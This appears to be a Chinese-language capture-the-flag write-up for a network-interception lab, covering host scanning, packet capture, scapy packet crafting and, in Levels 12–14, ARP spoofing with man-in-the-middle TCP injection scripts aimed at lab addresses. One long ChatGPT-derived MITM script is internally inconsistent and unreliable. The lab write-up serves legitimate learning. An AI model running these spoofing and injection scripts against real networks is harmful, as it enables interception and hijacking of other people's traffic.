# Level 1

## 思路

使用nc连接

## 截图



![image-20241123193521586](./03%20Intercepting%20Communication.assets/image-20241123193521586.png)



# Level 2

## 思路

使用nc进行监听

## EXP

chatgpt的答案：

![image-20241123195621006](./03%20Intercepting%20Communication.assets/image-20241123195621006.png)

## 截图

![image-20241123195728055](./03%20Intercepting%20Communication.assets/image-20241123195728055.png)

# Level 3

## 思路

先用nmap扫描子网活跃主机

其中一个是我们自己

然后nc连接

## 截图

![image-20241123200621397](./03%20Intercepting%20Communication.assets/image-20241123200621397.png)





# Level 4

## 问题描述

> Find and connect to a remote host on a large network

### 思路

也就是说，在更大的子网范围内搜索存活主机。

但是范围太多了，所以要优化指令：

以下是一条经过优化的 `nmap` 命令，用于加快 `/16` 子网的主机发现：

```bash
$ nmap -n -sn --max-retries 1 --min-rate 5000 --min-parallelism 100 10.0.0.0/16
```

真他娘的快

# Level 5

## 前置知识

```
tcpdump -i any port 31337 -X 
```



> ### **命令含义分解**
>
> #### **1. `tcpdump`**
>
> 这是网络数据包捕获工具，用于监听和分析网络接口上的流量。它可以显示流量的详细信息，帮助调试网络问题。
>
> #### **2. `-i any`**
>
> 指定监听的网络接口：
>
> - **`-i`**：选择监听的网络接口。
>
> - `any`
>
>   ：表示监听所有网络接口（包括有线、无线、虚拟等接口）。
>
>   - 如果不指定接口，`tcpdump` 默认会选择第一个非回环（`lo`）接口。
>
> #### **3. `port 31337`**
>
> 过滤条件，指定只捕获目标端口的流量：
>
> - `port 31337`
>
>   ：只捕获源端口或目标端口为 
>
>   ```
>   31337
>   ```
>
>    的流量。
>
>   - 如果不加此条件，`tcpdump` 会捕获所有接口上的所有流量。
>
> #### **4. `-X`**
>
> 以更详细的格式显示数据包内容：
>
> - 显示每个数据包的 **十六进制（hex）** 和 **ASCII** 表示。
> - 用于查看数据包的负载内容，分析具体传输的数据。
>
> ------
>
> ### **命令作用总结**
>
> 这条命令的作用是：
>
> 1. **监听所有网络接口上的流量**（包括环回接口和虚拟网络）。
> 2. **仅捕获与端口 `31337` 相关的数据包**。
> 3. **以十六进制和 ASCII 格式展示数据包的详细内容**，便于进一步分析。



## EXP

就是端口被监听了

现在你需要处理监听的流量

```
tcpdump -i any port 31337 -X 
```

![image-20241123203703284](./03%20Intercepting%20Communication.assets/image-20241123203703284.png)



---



妈的真抽象

![image-20241123203635500](./03%20Intercepting%20Communication.assets/image-20241123203635500.png)

# Level 6

## 题目描述

> Monitor slow traffic from a remote host

## 思路

在discord上，看到了提示信息：

![image-20241124163454006](./03%20Intercepting%20Communication.assets/image-20241124163454006.png)

于是我就了解了，大概是，读取400多个流量包。然后每个流量包里有flag的一部分。将这些凑在一起，就是flag。

于是交给chatgpt帮我分析流量数据（我压根看不懂）。



---



使用tcpdump或者tshark（wireshark的cli版本）捕获流量包到本地（capture.pcap）

tshark：（获得几百个流量就差不多了）

```bash
root@ip-10-0-0-2:~# tshark -i any -f "port 31337" -w capture1.pcap
Running as user "root" and group "root". This could be dangerous.
Capturing on 'any'
746 ^C

root@ip-10-0-0-2:~# 
```

tcpdump：（多等一会儿）

```bash
root@ip-10-0-0-2:~# tcpdump -i any port 31337 -w capture.pcap
tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
^C940 packets captured
943 packets received by filter
0 packets dropped by kernel
root@ip-10-0-0-2:~# 
```

然后转到流量放到本地的文件里。

接着用tshark来进行流量分析：（tcpdump功能比较少）

```bash
$ tcpdump -i any port 31337 -w capture.pcap
```

但是只是显示16进制的数据。比较麻烦，我就直接找chatgpt去了。



---



（我直接使用chatgpt生成代码来处理数据）

```python
from scapy.all import rdpcap, TCP
import re

def extract_tcp_data_from_pcap(pcap_file, target_port):
    # 读取 pcap 文件
    packets = rdpcap(pcap_file)
    extracted_data = ""

    # 遍历所有数据包
    for pkt in packets:
        # 筛选出 TCP 包，并且检查是否与目标端口相关
        if TCP in pkt and (pkt[TCP].sport == target_port or pkt[TCP].dport == target_port):
            # 提取 TCP Payload
            if pkt[TCP].payload:
                try:
                    # 将 TCP Payload 转换为字符串
                    extracted_data += bytes(pkt[TCP].payload).decode('latin1', errors='ignore')
                except UnicodeDecodeError:
                    # 如果解码失败，忽略该部分数据
                    continue

    return extracted_data

def remove_duplicate_characters(data):
    # 使用正则表达式去重重复字符（每个字符最多出现一次）
    return re.sub(r"(.)\1+", r"\1", data)

# 主程序
if __name__ == "__main__":
    # 指定 pcap 文件和目标端口
    pcap_file = "capture.pcap"  # 替换为你的文件路径
    target_port = 31337

    # 提取并打印与目标端口相关的 TCP Payload 数据
    data = extract_tcp_data_from_pcap(pcap_file, target_port)

    # 去重重复字符
    clean_data = remove_duplicate_characters(data)

    print("Extracted Data:\n", clean_data)
```

处理这个数据包就够了。

主要是数据会重复，所以中间就是去重了一部分。

# Level 7

## 题目描述

> Hijack traffic from a remote host by configuring your network interface

## 思路

修改自己的ip为10.0.0.2，然后listen 31337端口，然后就收到10.0.0.4发来的flag。

我靠，真是开眼了。

这中间存在的指令是：

```
ip addr
```

我确实没有想到过，直接添加一个假的ip就可以了？

还有，chatgpt太多时候真心挺傻逼的。

## 截图

![image-20241124191303034](./03%20Intercepting%20Communication.assets/image-20241124191303034.png)

# Level 8

## 问题描述

> Manually send an Ethernet packet

## 思路

手动发送ethernet packet？

下一步是不是就是手动发ip包了？

还真是



`ifconfig` 是一种旧的网络接口管理工具

`ip`是一个现代化的工具。

尽可能使用ip吧。

## EXP

```py
from scapy.all import *

# 创建自定义的以太网包
ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF) / IP(dst="10.0.0.3")

# 发送包
sendp(ethernet_frame)
```



- `Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF)`：创建一个以太网帧，`dst` 为目标 MAC 地址（这里是广播地址 `ff:ff:ff:ff:ff:ff`，即向所有设备广播），`type=0xFFFF` 设置以太网帧的类型。
- `/ IP(dst="10.0.0.3")`：这个部分是向数据帧中添加一个 IP 层，目标 IP 是 `10.0.0.3`，即你想要发送数据包的远程主机。
- `sendp(ethernet_frame)`：发送这个以太网帧。

如果你需要对 `scapy` 进行高级配置（如指定网络接口），你可以通过 `conf.iface` 来指定发送包的接口。例如，假设你的接口是 `eth0`：

```py
conf.iface = "eth0"
```

## 截图

如下

![image-20241124193542373](./03%20Intercepting%20Communication.assets/image-20241124193542373.png)



# Level 9

## 问题描述

> Manually send an Internet Protocol packet

## 思路

那就是，继续使用scapy发送ip包

## EXP

```py
from scapy.all import *

# 构建数据包
ip_packet = IP(dst="10.0.0.3", proto=0xFF) / Raw(b"Hello, this is a custom packet!")

conf.iface = "eth0"

# 发送数据包
send(ip_packet)
```

- `IP(dst="10.0.0.3", proto=0xFF)`：构建一个目标地址为 `10.0.0.3`，协议为 `0xFF` 的 IP 数据包。
- `Raw(b"Hello, this is a custom packet!")`：附加自定义的原始数据（这部分可以根据需要修改）。

## 截图

如下

![image-20241124194325763](./03%20Intercepting%20Communication.assets/image-20241124194325763.png)

## 总结

注意每次start challenge，你都没有ip，要手动配置ip。

# Level 10

## 问题描述

> Manually send a Transmission Control Protocol packet

## 思路

估计还是使用scapy

## EXP

```py
from scapy.all import *

# 构建 TCP 数据包
tcp_packet = IP(dst="10.0.0.3") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")

conf.iface = "eth0"

# 发送数据包
send(tcp_packet)
```



- `IP(dst="10.0.0.3")`：构建一个目标地址为 `10.0.0.3` 的 IP 数据包。
- `TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")`：创建一个 TCP 数据包，设置源端口、目标端口、序列号、确认号，并设置标志位为 `APRSF`。
- `send(tcp_packet)`：发送构建好的数据包。

## 截图

如图

![image-20241124194824586](./03%20Intercepting%20Communication.assets/image-20241124194824586.png)

# Level 11

## 问题描述

> Manually perform a Transmission Control Protocol handshake

## 思路

问chatgpt，它什么都知道

## EXP

代码：

```py
from scapy.all import *

# 目标 IP 和端口
target_ip = "10.0.0.3"
target_port = 31337

# 步骤 1：发送 SYN 包
syn_packet = IP(dst=target_ip) / TCP(sport=31337, dport=target_port, seq=31337, flags="S")
syn_ack_response = sr1(syn_packet)  # 发送 SYN 包并等待响应

# 步骤 2：发送 SYN-ACK 包（如果接收到 SYN-ACK 响应）
if syn_ack_response and syn_ack_response.haslayer(TCP) and syn_ack_response[TCP].flags == "SA":
    ack_packet = IP(dst=target_ip) / TCP(sport=31337, dport=target_port, seq=syn_ack_response[TCP].ack, ack=syn_ack_response[TCP].seq + 1, flags="A")
    send(ack_packet)
    print("三次握手完成！")
else:
    print("没有收到有效的 SYN-ACK 响应，握手失败。")
```



## 截图

如图

![image-20241124195124551](./03%20Intercepting%20Communication.assets/image-20241124195124551.png)

## 总结

必须好好看看代码

# Level 12

## 问题描述

> Manually send an Address Resolution Protocol packet

## 思路

gpt

在你只知道ip，但是不知道对方的mac地址的时候，你就需要发送arp包，进行广播，获取到对方的mac地址。

## EXP

```py
from scapy.all import *

# Your own IP and MAC address
sender_ip = "10.0.0.2"
sender_mac = "52:d0:05:72:2c:85"

# Target IP
target_ip = "10.0.0.3"

# Create the ARP reply
arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)

# Create Ethernet frame
ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

# Combine Ethernet frame and ARP reply
packet = ethernet_frame / arp_reply

# Send the ARP reply on the correct network interface
sendp(packet, iface="eth0", verbose=False)

```

## 截图

如图

![image-20241124201743995](./03%20Intercepting%20Communication.assets/image-20241124201743995.png)

# Level 13

## 问题描述

> Hijack traffic from a remote host using ARP

## 思路

在一番思索和gpt的解释时候，我理解了这个攻击的方法：

首先，我们的ip和mac_addr是已知的。

然后10.0.0.2和10.0.0.4在通信。整个网络的ip和mac_addr的对应是正确的。

那么我们要改变10.0.0.4的ip mac对应的表。

让10.0.0.4发送给10.0.0.2的数据的mac地址改为我们自己的mac地址。

这样就会造成10.0.0.4的ip mac 对应table的混乱。

于是10.0.0.4发送给`IP:10.0.0.2 MAC:10.0.0.2的mac addr`的数据包就变为发送给`IP:10.0.0.2 MAC:10.0.0.3的mac addr`。于是我们就能收到10.0.0.4发送的flag。

可能我写的很混乱。也是在此刻才意识到自己网络知识的薄弱。

各种情绪五味杂陈。

这道题其中值得玩味的地方很多很多。



## EXP

```py
from scapy.all import *

sender_ip = "10.0.0.2"

sender_mac = "ea:07:6b:bf:a2:ee"

target_ip = "10.0.0.4"

arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)

ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

packet = ethernet_frame / arp_reply

sendp(packet, iface="eth0", verbose=False)
```

随后，再开启31337端口listen即可

## 截图

如图

![image-20241124204821543](./03%20Intercepting%20Communication.assets/image-20241124204821543.png)

# Level 14

## 问题描述

> Man-in-the-middle traffic between two remote hosts and inject extra traffic





## EXP

```py
from scapy.all import *

sender_ip = "10.0.0.3"

sender_mac = "d6:31:26:73:8b:2c"

target_ip = "10.0.0.4"

arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)

ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

packet = ethernet_frame / arp_reply

sendp(packet, iface="eth0", verbose=False)
```



第二个

```py
from scapy.all import *

sender_ip = "10.0.0.4"

sender_mac = "d6:31:26:73:8b:2c"

target_ip = "10.0.0.3"

arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)

ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

packet = ethernet_frame / arp_reply

sendp(packet, iface="eth0", verbose=False)
```



```py
from scapy.all import rdpcap, TCP

def extract_tcp_data_from_pcap(pcap_file, target_port):
    # 读取 pcap 文件
    packets = rdpcap(pcap_file)
    extracted_data = []

    # 遍历所有数据包
    for pkt in packets:
        # 筛选出 TCP 包，并且检查是否与目标端口相关
        if TCP in pkt and (pkt[TCP].sport == target_port or pkt[TCP].dport == target_port):
            # 提取 TCP Payload
            if pkt[TCP].payload:
                try:
                    # 获取来源 IP 和目的 IP
                    src_ip = pkt[0][1].src
                    dst_ip = pkt[0][1].dst

                    # 将 TCP Payload 转换为字符串
                    payload_data = bytes(pkt[TCP].payload).decode('latin1', errors='ignore')

                    # 保存来源 IP、目的 IP 和数据
                    extracted_data.append({
                        "src": src_ip,
                        "dst": dst_ip,
                        "data": payload_data
                    })
                except UnicodeDecodeError:
                    # 如果解码失败，忽略该部分数据
                    continue

    return extracted_data

def remove_duplicate_characters(data):
    # 使用字符串去重
    return ''.join(dict.fromkeys(data))

# 主程序
if __name__ == "__main__":
    # 指定 pcap 文件和目标端口
    pcap_file = "144.pcap"  # 替换为你的文件路径
    target_port = 31337

    # 提取并打印与目标端口相关的 TCP Payload 数据
    packets_data = extract_tcp_data_from_pcap(pcap_file, target_port)

    print("Extracted Data:")
    for entry in packets_data:
        # 去重重复字符
        clean_data = remove_duplicate_characters(entry["data"])
        print(f"From {entry['src']} To {entry['dst']}: {clean_data}")

```





```py
from scapy.all import rdpcap, IP, TCP, send

def extract_and_respond(pcap_file, target_port, custom_response):
    # 读取 pcap 文件
    packets = rdpcap(pcap_file)

    for pkt in packets:
        # 筛选出 TCP 包，并且检查是否与目标端口相关
        if TCP in pkt and (pkt[TCP].sport == target_port or pkt[TCP].dport == target_port):
            if pkt[TCP].payload:
                try:
                    # 提取来源和目的 IP 地址
                    src_ip = pkt[IP].src
                    dst_ip = pkt[IP].dst

                    # 提取数据包内容
                    payload_data = bytes(pkt[TCP].payload).decode('latin1', errors='ignore').strip()

                    print(f"From {src_ip} To {dst_ip}: {payload_data}")

                    # 如果匹配到目标数据并需要响应
                    if "ECHO" in payload_data:
                        print(f"Responding with: {custom_response}")

                        # 构建并发送伪造响应数据包
                        ip_layer = IP(src=dst_ip, dst=src_ip)  # 交换 src 和 dst
                        tcp_layer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq + len(payload_data))
                        response_packet = ip_layer / tcp_layer / custom_response
                        send(response_packet, verbose=False)
                except UnicodeDecodeError:
                    continue

if __name__ == "__main__":
    # 读取 pcap 文件和目标端口
    pcap_file = "144.pcap"  # 替换为你的文件路径
    target_port = 31337

    # 定义自定义响应
    custom_response = "ECHO FLAG"

    # 提取并发送响应
    extract_and_respond(pcap_file, target_port, custom_response)

```







```py
import scapy.all as scapy
import os
import time
import random
import socket

class MITMHost:
    def __init__(self, attacker_ip, attacker_mac, server_ip, server_mac, client_ip, client_mac):
        self.attacker_ip = attacker_ip
        self.attacker_mac = attacker_mac
        self.server_ip = server_ip
        self.server_mac = server_mac
        self.client_ip = client_ip
        self.client_mac = client_mac

    def send_arp(self, target_ip, target_mac, source_ip, source_mac):
        """
        发送ARP包，伪造ARP响应，告诉目标主机该IP的MAC地址
        """
        arp_packet = scapy.ARP(op=2, psrc=source_ip, pdst=target_ip, hwsrc=source_mac, hwdst=target_mac)
        scapy.sendp(arp_packet, verbose=False)

    def spoof(self):
        """
        伪造ARP响应，使客户端与服务器之间的流量转发到攻击者
        """
        self.send_arp(self.client_ip, self.client_mac, self.server_ip, self.server_mac)
        self.send_arp(self.server_ip, self.server_mac, self.client_ip, self.client_mac)

    def restore(self):
        """
        恢复正常的ARP表
        """
        self.send_arp(self.client_ip, self.client_mac, self.server_ip, self.server_mac)
        self.send_arp(self.server_ip, self.server_mac, self.client_ip, self.client_mac)

    def run(self):
        """
        启动ARP欺骗攻击并嗅探流量
        """
        while True:
            self.spoof()  # 持续伪造ARP响应
            time.sleep(1)

class MITMHandshakeHost:
    def __init__(self, attacker_ip, attacker_mac, server_ip, client_ip):
        self.attacker_ip = attacker_ip
        self.attacker_mac = attacker_mac
        self.server_ip = server_ip
        self.client_ip = client_ip
        self.seq = None  # 用于记录当前的TCP序列号

    def intercept_traffic(self, packet):
        """
        拦截并篡改TCP流量，特别是在握手阶段
        """
        if "IP" in packet and "TCP" in packet:
            # 监听来自客户端的SYN包，进行握手
            if packet["IP"].src == self.client_ip and packet["TCP"].flags == "S" and packet["IP"].dst == self.server_ip:
                self.seq = random.randrange(0, 2**32)
                scapy.sendp(
                    scapy.Ether(src=self.attacker_mac, dst=packet["Ether"].src) /
                    scapy.IP(src=self.server_ip, dst=self.client_ip) /
                    scapy.TCP(sport=packet["TCP"].dport, dport=packet["TCP"].sport, seq=self.seq, ack=packet["TCP"].seq + 1, flags="SA"),
                    iface="eth0",
                    verbose=False,
                )

            # 监听服务器的ACK包并确认连接
            if packet["IP"].src == self.server_ip and packet["TCP"].flags == "A" and packet["IP"].dst == self.client_ip:
                # 发送数据包完成握手，进行后续操作
                scapy.sendp(
                    scapy.Ether(src=self.attacker_mac, dst=packet["Ether"].src) /
                    scapy.IP(src=self.server_ip, dst=self.client_ip) /
                    scapy.TCP(sport=packet["TCP"].dport, dport=packet["TCP"].sport, seq=self.seq, ack=packet["TCP"].seq + 1, flags="A"),
                    iface="eth0",
                    verbose=False,
                )
                return True

    def run(self):
        """
        启动TCP嗅探和篡改
        """
        scapy.sniff(prn=self.intercept_traffic, iface="eth0")

class MITMAuthenticatedHost:
    def __init__(self, attacker_ip, server_ip, client_ip, attacker_mac):
        self.attacker_ip = attacker_ip
        self.server_ip = server_ip
        self.client_ip = client_ip
        self.attacker_mac = attacker_mac
        self.secret = None

    def intercept_authentication(self, connection):
        """
        拦截并伪造 secret 认证信息
        """
        self.send(connection, b"SECRET:\n")
        client_secret = connection.recv(0x1000).decode("latin").strip()
        self.secret = client_secret  # 获取客户端的 secret

        self.send(connection, b"COMMANDS:\nECHO\nFLAG\nCOMMAND:\n")
        command = connection.recv(0x1000).decode("latin").strip()

        if command == "FLAG":
            if self.secret:
                self.send(connection, self.secret.encode())  # 获取 secret
                self.send(connection, b"flag{fake_flag}\n")  # 返回伪造的 flag
            else:
                self.send(connection, b"UNAUTHORIZED\n")
        else:
            self.send(connection, b"???\n")

    def send(self, connection, data):
        """
        向连接发送数据
        """
        connection.sendall(data)

    def run(self):
        """
        启动认证劫持
        """
        while True:
            try:
                with socket.create_connection((self.server_ip, 31337)) as connection:
                    self.intercept_authentication(connection)
            except (ConnectionError, TimeoutError):
                pass
            time.sleep(1)

def run_mitm_attack():
    attacker_ip = "10.0.0.1"  # 攻击者的 IP
    attacker_mac = "00:00:00:00:00:01"  # 攻击者的 MAC 地址
    server_ip = "10.0.0.3"  # 服务器的 IP 地址
    server_mac = "00:00:00:00:00:02"  # 服务器的 MAC 地址
    client_ip = "10.0.0.2"  # 客户端的 IP 地址
    client_mac = "00:00:00:00:00:03"  # 客户端的 MAC 地址

    # 启动 ARP 欺骗攻击
    mitm_host = MITMHost(attacker_ip, attacker_mac, server_ip, server_mac, client_ip, client_mac)
    mitm_host.run()

    # 启动 TCP 握手篡改
    mitm_handshake_host = MITMHandshakeHost(attacker_ip, attacker_mac, server_ip, client_ip)
    mitm_handshake_host.run()

    # 启动认证拦截
    mitm_authenticated_host = MITMAuthenticatedHost(attacker_ip, server_ip, client_ip, attacker_mac)
    mitm_authenticated_host.run()

run_mitm_attack()

```





```py
from scapy.all import *

local_mac = get_if_hwaddr("eth0")
local_ip = '10.0.0.2'

target_ip1 = '10.0.0.3'
target_mac1 = getmacbyip(target_ip1)
target_ip2 = '10.0.0.4'
target_mac2 = getmacbyip(target_ip2)

# ether_pkt = Ether(src=local_mac, dst=target_ip1)

arp_spoof = ARP(
        pdst=target_ip2,  # Target IP address
        hwdst=target_mac2, # Target MAC address
        psrc=target_ip1,   # Source IP address (your IP)
        hwsrc=local_mac, # Source MAC address (your MAC)
        op=2              # op=2 for ARP reply (is-at)
    )
send(arp_spoof)
arp_spoof = ARP(
        pdst=target_ip1,  # Target IP address
        hwdst=target_mac1, # Target MAC address
        psrc=target_ip2,   # Source IP address (your IP)
        hwsrc=local_mac, # Source MAC address (your MAC)
        op=2              # op=2 for ARP reply (is-at)
    )
send(arp_spoof)

def pkt_inject(pkt):
    # return
    if pkt[TCP] and bytes(pkt[TCP].payload) == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
        print(b'pwn!')
        ip_pkt = IP(src='10.0.0.4', dst='10.0.0.3')
        print(pkt[TCP].seq)
        tcp_pkt1 = TCP(sport=pkt[TCP].dport, dport=31337, flags='A', seq=pkt[TCP].ack, ack=pkt[TCP].seq+29)
        tcp_pkt2 = TCP(sport=pkt[TCP].dport, dport=31337, flags='PA', seq=pkt[TCP].ack, ack=pkt[TCP].seq+29) / b'FLAG\n'
        send(ip_pkt / tcp_pkt1)
        send(ip_pkt / tcp_pkt2)





packets = sniff(iface='eth0', count=200, prn=pkt_inject)

wrpcap('flag.pcap', packets)
# for i in range(20):
#     print(packets[i])
#     print(packets[i].show())
#     print(bytes(packets[i][TCP].payload))
```

